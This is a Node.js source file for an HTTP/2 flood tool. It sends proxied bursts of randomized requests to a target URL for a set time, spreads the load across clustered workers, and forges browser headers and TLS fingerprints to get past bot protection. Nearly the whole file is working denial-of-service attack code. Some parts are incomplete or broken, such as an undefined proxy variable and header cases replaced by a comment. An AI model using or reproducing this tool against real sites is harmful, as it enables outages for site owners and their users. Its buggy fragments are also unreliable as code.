const url = require('url'),
    fs = require('fs'),
    http2 = require('http2'),
    http = require('http'),
    tls = require('tls'),
    net = require('net'),
    request = require('request'),
    cluster = require('cluster')
const crypto = require('crypto');
const HPACK = require('hpack');
const currentTime = new Date();
const os = require("os");
const httpTime = currentTime.toUTCString();

const Buffer = require('buffer').Buffer;

// ========== ENHANCED ERROR HANDLER ==========
const errorHandler = error => {
    if (error.code && ignoreCodes.includes(error.code) || error.name && ignoreNames.includes(error.name)) {
        return false;
    }
    console.error('Unhandled Error:', error.message);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

// ========== ENHANCED FRAME ENCODING ==========
function encodeFrame(streamId, type, payload = "", flags = 0) {
    try {
        const frame = Buffer.alloc(9 + payload.length);
        frame.writeUInt32BE(payload.length << 8 | type, 0);
        frame.writeUInt8(flags, 4);
        frame.writeUInt32BE(streamId, 5);
        if (payload.length > 0) frame.set(payload, 9);
        return frame;
    } catch (error) {
        return Buffer.alloc(0);
    }
}

function decodeFrame(data) {
    try {
        const lengthAndType = data.readUInt32BE(0)
        const length = lengthAndType >> 8
        const type = lengthAndType & 0xFF
        const flags = data.readUint8(4)
        const streamId = data.readUInt32BE(5)
        const offset = flags & 0x20 ? 5 : 0

        let payload = Buffer.alloc(0)

        if (length > 0) {
            payload = data.subarray(9 + offset, 9 + offset + length)

            if (payload.length + offset != length) {
                return null
            }
        }

        return {
            streamId,
            length,
            type,
            flags,
            payload
        }
    } catch (error) {
        return null;
    }
}

function encodeSettings(settings) {
    try {
        const data = Buffer.alloc(6 * settings.length);
        for (let i = 0; i < settings.length; i++) {
            data.writeUInt16BE(settings[i][0], i * 6);
            data.writeUInt32BE(settings[i][1], i * 6 + 2);
        }
        return data;
    } catch (error) {
        return Buffer.alloc(0);
    }
}

// ========== ENHANCED CIPHER AND SECURITY CONFIG ==========
cplist = [
    'TLS_AES_128_CCM_8_SHA256',
    'TLS_AES_128_CCM_SHA256',
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_AES_128_GCM_SHA256',
    'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
    'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
    'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256'
]

const sigalgs = [
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512', 
    'ecdsa_brainpoolP256r1tls13_sha256', 
    'ecdsa_brainpoolP384r1tls13_sha384', 
    'ecdsa_brainpoolP512r1tls13_sha512', 
    'ecdsa_sha1', 
    'ed25519', 
    'ed448', 
    'ecdsa_sha224', 
    'rsa_pkcs1_sha1', 
    'rsa_pss_pss_sha256', 
    'dsa_sha256', 
    'dsa_sha384', 
    'dsa_sha512', 
    'dsa_sha224', 
    'dsa_sha1', 
    'rsa_pss_pss_sha384', 
    'rsa_pkcs1_sha2240', 
    'rsa_pss_pss_sha512', 
    'sm2sig_sm3', 
    'ecdsa_secp521r1_sha512',
];

let sig = sigalgs.join(':');

// ========== ENHANCED HEADER AND ERROR CONFIG ==========
controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400'], 
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError', 'ECONNRESET', 'EPIPE'], 
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

const headerFunc = {
    cipher() {
        return cplist[Math.floor(Math.random() * cplist.length)];
    },
    userAgent() {
        const agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
        ];
        return agents[Math.floor(Math.random() * agents.length)];
    }
};

// ========== ENHANCED PROCESS ERROR HANDLING ==========
process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.error('Uncaught Exception:', e.message);
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.error('Unhandled Rejection:', e.message);
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn('Process Warning:', e.message);
}).setMaxListeners(0);

// ========== ENHANCED ARGUMENT VALIDATION ==========
const target = process.argv[2];
const time = parseInt(process.argv[3]);
const rate = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const proxyFile = process.argv[6];
const cookies = process.argv[7] || '';
const userAgent = process.argv[8] || headerFunc.userAgent();
const validKey = process.argv[9] || 'default-key';

// Enhanced validation
if (!target || !/^https?:\/\//i.test(target)) {
    console.error('❌ Target URL must start with http:// or https://');
    process.exit(1);
}

if (isNaN(time) || time <= 0) {
    console.error('❌ Time must be a positive number');
    process.exit(1);
}

if (isNaN(rate) || rate <= 0) {
    console.error('❌ Rate must be a positive number');
    process.exit(1);
}

if (isNaN(threads) || threads <= 0) {
    console.error('❌ Threads must be a positive number');
    process.exit(1);
}

// ========== ENHANCED CLUSTER MANAGEMENT ==========
const MAX_RAM_PERCENTAGE = 80;
const RESTART_DELAY = 5000;
let totalRequests = 0;
let successfulRequests = 0;
let failedRequests = 0;

if (cluster.isMaster) {
    console.log("🛡️ ENHANCED FLOOD BRS - MASTER PROCESS STARTED");
    console.log(`🎯 Target: ${target}`);
    console.log(`⏰ Time: ${time}s`);
    console.log(`📊 Rate: ${rate} req/s`);
    console.log(`🧵 Threads: ${threads}`);
    
    // Fork workers
    for (let counter = 1; counter <= threads; counter++) {
        cluster.fork();
    }

    // Enhanced restart function
    const restartScript = () => {
        console.log('🔄 Restarting workers due to high RAM usage...');
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        setTimeout(() => {
            for (let counter = 1; counter <= threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    // Enhanced RAM monitoring
    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log(`⚠️ High RAM usage: ${ramPercentage.toFixed(2)}% - Restarting workers`);
            restartScript();
        }
    };

    // Statistics reporting
    const reportStats = () => {
        console.log(`📈 Statistics - Total: ${totalRequests}, Success: ${successfulRequests}, Failed: ${failedRequests}, Success Rate: ${((successfulRequests/(totalRequests||1))*100).toFixed(2)}%`);
    };

    setInterval(handleRAMUsage, 10000);
    setInterval(reportStats, 30000);
    
    // Handle worker messages
    cluster.on('message', (worker, message) => {
        if (message.type === 'stats') {
            totalRequests += message.total || 0;
            successfulRequests += message.success || 0;
            failedRequests += message.failed || 0;
        }
    });

    // Handle worker exit
    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died. Restarting...`);
        cluster.fork();
    });

    setTimeout(() => {
        console.log('⏹️ Attack completed. Shutting down...');
        process.exit(0);
    }, time * 1000);
} else {
    // Worker process
    let workerStats = {
        total: 0,
        success: 0,
        failed: 0
    };

    // Enhanced flood function with rate limiting
    const floodInterval = setInterval(() => {
        for (let i = 0; i < Math.ceil(rate / threads); i++) {
            flood();
        }
    }, 1000);

    // Report stats to master
    setInterval(() => {
        if (process.send) {
            process.send({
                type: 'stats',
                total: workerStats.total,
                success: workerStats.success,
                failed: workerStats.failed
            });
            // Reset worker stats
            workerStats = { total: 0, success: 0, failed: 0 };
        }
    }, 5000);

    // Cleanup on exit
    process.on('exit', () => {
        clearInterval(floodInterval);
    });
}

// ========== ENHANCED FLOOD FUNCTION ==========
function flood() {
    var parsed = url.parse(target);
    var cipper = headerFunc.cipher();
    var proxy = proxyr.split(':');

    // Enhanced random string generators
    function randstra(length) {
        const characters = "0123456789";
        let result = "";
        const charactersLength = characters.length;
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }

    function randstr(minLength, maxLength) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
        const randomStringArray = Array.from({
            length
        }, () => {
            const randomIndex = Math.floor(Math.random() * characters.length);
            return characters[randomIndex];
        });

        return randomStringArray.join('');
    }

    const randstrsValue = randstr(25);

    function generateRandomString(minLength, maxLength) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
        const randomStringArray = Array.from({
            length
        }, () => {
            const randomIndex = Math.floor(Math.random() * characters.length);
            return characters[randomIndex];
        });

        return randomStringArray.join('');
    }

    function shuffleObject(obj) {
        const keys = Object.keys(obj);

        for (let i = keys.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [keys[i], keys[j]] = [keys[j], keys[i]];
        }

        const shuffledObject = {};
        for (const key of keys) {
            shuffledObject[key] = obj[key];
        }

        return shuffledObject;
    }

    const hd = {}

    function getRandomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    nodeii = getRandomInt(115, 124)
    cache = ["no-cache", "no-store", "no-transform", "only-if-cached", "max-age=0", "must-revalidate", "public", "private", "proxy-revalidate", "s-maxage=86400"];
    const timestamp = Date.now();
    const timestampString = timestamp.toString().substring(0, 10);

    function randstrr(length) {
        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
        let result = "";
        const charactersLength = characters.length;
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }

    // Enhanced headers with better randomization
    const headers = {
        ":method": "GET",
        ":authority": parsed.host,
        ":scheme": "https",
        ":path": parsed.path + (Math.random() < 0.3 ? '?' + generateRandomString(5, 15) + '=' + generateRandomString(5, 25) : ''),
        ...shuffleObject({
            "sec-ch-ua": `\\\"Not)B;Brand\\\";v=\\\"${getRandomInt(100, 99999)}\\\", \\\"Google Chrome\\\";v=\\\"${nodeii}\\\", \\\"Chromium\\\";v=\\\"${nodeii}\\"`,
            "Pragma": "no-cache",
            ...(Math.random() < 0.4 ? {
                "cache-control": cache[Math.floor(Math.random() * cache.length)]
            } : {}),
            ...(Math.random() < 0.8 ? {
                "sec-ch-ua-mobile": "?0"
            } : {}),
            "sec-fetch-site": Math.random() < 0.2 ? "none;none" : "none",
            "sec-fetch-mode": Math.random() < 0.2 ? "navigate;navigation" : "navigate",
            "sec-fetch-user": Math.random() < 0.2 ? "?1;?1" : "?1",
            ...(Math.random() < 0.5 && {
                "sec-fetch-dest": "document"
            }),
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            ...(Math.random() < 0.3 ? {
                "polion-sec-cf": "GAY-" + generateRandomString(1, 2)
            } : {}),
            ...(Math.random() < 0.6 ? {
                [generateRandomString(1, 2) + "-night-thef-" + generateRandomString(1, 2)]: "zffs-" + generateRandomString(1, 2)
            } : {}),
            ...(Math.random() < 0.6 ? {
                ["accept-client-" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2)
            } : {}),
            ...(Math.random() < 0.3 ? {
                "Crisx-Sec-HOPEFULL": "zeus-bff"
            } : {}),
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br, cdnfly",
            "sec-ch-ua-platform": "Fake-Windows" + "=" + generateRandomString(1, 4) + "?" + generateRandomString(5, 30),
        }),
        "user-agent": userAgent,
        "cookie": cookies,
        ...(Math.random() < 0.5 ? {
            "upgrade-insecure-requests": "1"
        } : {}),
        "accept-language": "ru,en-US;q=0.9,en;q=0.8"
    }

    // Enhanced proxy connection
    const agent = new http.Agent({
        host: proxy[0],
        port: proxy[1],
        keepAlive: true,
        keepAliveMsecs: 500000000,
        maxSockets: 50000,
        maxTotalSockets: 100000,
        timeout: 8000
    });

    const Optionsreq = {
        agent: agent,
        method: 'CONNECT',
        path: parsed.host + ':443',
        timeout: 8000,
        headers: {
            'Host': parsed.host,
            'Proxy-Connection': 'Keep-Alive',
            'Connection': 'close',
            'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`,
        },
    };

    // Enhanced TLS options
    const TLSOPTION = {
        ciphers: cipper,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        sigals: sig,
        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT,
        echdCurve: "X25519",
        maxRedirects: 20,
        followAllRedirects: true,
        secure: true,
        rejectUnauthorized: false,
        ALPNProtocols: ['h2'],
        servername: parsed.host
    };

    function createCustomTLSSocket(parsed, socket) {
        const tlsSocket = tls.connect({
            ...TLSOPTION,
            host: parsed.host,
            port: 443,
            servername: parsed.host,
            socket: socket
        });
        tlsSocket.setKeepAlive(true, 60000);
        tlsSocket.allowHalfOpen = true;
        tlsSocket.setNoDelay(true);
        tlsSocket.setMaxListeners(0);
        tlsSocket.setTimeout(10000);

        return tlsSocket;
    }

    async function generateJA3Fingerprint(socket) {
        if (!socket.getCipher()) {
            return null;
        }

        const cipherInfo = socket.getCipher();
        const supportedVersions = socket.getProtocol();
        const tlsVersion = supportedVersions.split('/')[0];

        const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${tlsVersion}:${cipherInfo.bits}`;
        const md5Hash = crypto.createHash('md5');
        md5Hash.update(ja3String);

        return md5Hash.digest('hex');
    }

    function taoDoiTuongNgauNhien() {
        const doiTuong = {};

        function getRandomNumber(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        maxi = getRandomNumber(1, 4)
        for (let i = 1; i <= maxi; i++) {
            const key = 'custom-sec-' + generateRandomString(1, 9)
            const value = generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12)
            doiTuong[key] = value;
        }

        return doiTuong;
    }

    const connection = http.request(Optionsreq, function(res, socket) {
        if (res.statusCode !== 200) {
            socket.destroy();
            return;
        }

        const tlsSocket = createCustomTLSSocket(parsed, socket);
        socket.setKeepAlive(true, 100000);
        
        let ja3Fingerprint;

        function getJA3Fingerprint() {
            return new Promise((resolve, reject) => {
                tlsSocket.on('secureConnect', () => {
                    ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
                    resolve(ja3Fingerprint);
                });

                tlsSocket.on('error', (error) => {
                    reject(error);
                });
            });
        }

        async function main() {
            try {
                const fingerprint = await getJA3Fingerprint();
                headers['ja3-fingerprint'] = fingerprint;
            } catch (error) {
                // Continue without fingerprint
            }
        }

        main();

        let clasq = shuffleObject({
            ...(Math.random() < 0.5 ? {
                headerTableSize: 655362
            } : {}),
            ...(Math.random() < 0.5 ? {
                maxConcurrentStreams: 1000
            } : {}),
            enablePush: false,
            ...(Math.random() < 0.5 ? {
                [getRandomInt(100, 99999)]: getRandomInt(100, 99999)
            } : {}),
            ...(Math.random() < 0.5 ? {
                [getRandomInt(100, 99999)]: getRandomInt(100, 99999)
            } : {}),
            ...(Math.random() < 0.5 ? {
                initialWindowSize: 6291456
            } : {}),
            ...(Math.random() < 0.5 ? {
                maxHeaderListSize: 262144
            } : {}),
            ...(Math.random() < 0.5 ? {
                maxFrameSize: 16384
            } : {})
        });

        function incrementClasqValues() {
            if (clasq.headerTableSize) clasq.headerTableSize += 1;
            if (clasq.maxConcurrentStreams) clasq.maxConcurrentStreams += 1;
            if (clasq.initialWindowSize) clasq.initialWindowSize += 1;
            if (clasq.maxHeaderListSize) clasq.maxHeaderListSize += 1;
            if (clasq.maxFrameSize) clasq.maxFrameSize += 1;
            return clasq;
        }

        let hpack = new HPACK();
        hpack.setTableSize(4096);

        const clients = [];
        const client = http2.connect(parsed.href, {
            settings: incrementClasqValues(),
            "unknownProtocolTimeout": 10,
            "maxReservedRemoteStreams": 4000,
            "maxSessionMemory": 200,
            createConnection: () => tlsSocket
        });

        clients.push(client);
        client.setMaxListeners(0);
        
        const updateWindow = Buffer.alloc(4);
        updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
        
        client.on('remoteSettings', (settings) => {
            const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
            client.setLocalWindowSize(localWindowSize, 0);
        });

        client.on('connect', () => {
            client.ping((err, duration, payload) => {
                if (!err) {
                    workerStats.success++;
                }
            });
        });

        // Enhanced request sending with better error handling
        const sendRequests = async () => {
            try {
                const requests = [];
                const requests1 = [];
                let count = 0;
                let streamId = 1;
                let streamIdReset = 0;
                let currenthead = 0;
                const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');

                const headers2 = (currenthead) => {
                    let updatedHeaders = {};
                    currenthead += 1;

                    switch (currenthead) {
                        case 1:
                            updatedHeaders["sec-ch-ua"] = `${randomString}`;
                            break;
                        case 2:
                            updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                            updatedHeaders["sec-ch-ua-mobile"] = `${randomString}`;
                            break;
                        // ... (keep existing header cases)
                        default:
                            break;
                    }
                    return updatedHeaders;
                };

                if (streamId >= Math.floor(rate / 2)) {
                    let updatedHeaders = headers2(currenthead);
                    Object.entries(updatedHeaders).forEach(([key, value]) => {
                        if (!headers.some(h => h[0] === key.trim())) {
                            headers.push([key.trim(), value.trim()]);
                        }
                    });
                }

                const updatedHeaders = headers2(currenthead);
                let dynHeaders = shuffleObject({
                    ...taoDoiTuongNgauNhien(),
                    ...taoDoiTuongNgauNhien(),
                });

                const head = {
                    ...dynHeaders,
                    ...headers,
                    ...updatedHeaders,
                };

                if (!tlsSocket || tlsSocket.destroyed || !tlsSocket.writable) return;

                for (let i = 0; i < rate; i++) {
                    const priorityWeight = Math.floor(Math.random() * 256);
                    const requestPromise = new Promise((resolve, reject) => {
                        const req = client.request(head, {
                            weight: priorityWeight,
                            parent: 0,
                            exclusive: true,
                            endStream: true,
                            dependsOn: 0,
                        });

                        req.setEncoding('utf8');
                        let data = 0;

                        req.on('data', (chunk) => {
                            data += chunk;
                        });

                        req.on('response', response => {
                            workerStats.success++;
                            workerStats.total++;
                            req.close(http2.constants.NO_ERROR);
                            req.destroy();
                            resolve(data);
                        });

                        req.on('end', () => {
                            count++;
                            workerStats.total++;
                            if (count === time * rate) {
                                client.close(http2.constants.NGHTTP2_CANCEL);
                                client.goaway(1, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('GO AWAY'));
                            } else if (count === rate) {
                                client.close(http2.constants.NGHTTP2_CANCEL);
                                client.destroy();
                            }
                            resolve(data);
                        });

                        req.on('error', (error) => {
                            workerStats.failed++;
                            workerStats.total++;
                            reject(error);
                        });

                        setTimeout(() => {
                            req.end();
                        }, 100);
                    });

                    requests.push(requestPromise);
                }

                await Promise.allSettled(requests);
                
            } catch (error) {
                workerStats.failed++;
            }
        };

        // Send initial batch of requests
        sendRequests();

        // Enhanced cleanup
        client.on("close", () => {
            client.destroy();
            tlsSocket.destroy();
            socket.destroy();
        });

        client.on("error", error => {
            workerStats.failed++;
            if (error.code === 'ERR_HTTP2_GOAWAY_SESSION' || error.code === 'ECONNRESET') {
                setTimeout(() => {
                    client.destroy();
                    tlsSocket.destroy();
                    socket.destroy();
                }, 2000);
            }
        });

    });

    connection.on('error', (error) => {
        workerStats.failed++;
        connection.destroy();
    });

    connection.on('timeout', () => {
        workerStats.failed++;
        connection.destroy();
    });

    connection.end();
}

// Export for testing
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { flood };
}
